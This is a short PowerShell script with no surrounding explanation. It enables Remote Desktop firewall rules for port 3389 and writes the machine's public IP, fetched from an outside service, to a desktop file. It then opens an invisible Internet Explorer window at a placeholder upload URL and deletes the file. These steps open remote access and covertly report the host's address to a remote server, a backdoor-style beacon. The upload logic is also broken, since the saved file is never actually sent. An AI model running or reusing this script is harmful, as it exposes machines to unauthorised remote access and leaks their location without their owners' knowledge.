$desktop = [Environment]::GetFolderPath("Desktop")
$fileToUpload = "$desktop\outfile.txt"

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

$FireWall = New-Object -comObject HNetCfg.FwPolicy2
$EnableRules = $FireWall.rules | Where-Object {$_.LocalPorts -like "*3389*" -and $_.Profiles -eq "3"}
ForEach ($Rule In $EnableRules){($Rule.Enabled = "True")}

(Invoke-WebRequest https://itomation.ca/mypublicip).content | Out-File "$desktop\outfile.txt"

$ie = New-Object -com "InternetExplorer.Application"
$ie.visible = $False
$ie.navigate("<your url>/upload.php")

while($ie.ReadyState -ne 4) {Start-Sleep -m 100}

Remove-Item -path $desktop\outfile.txt
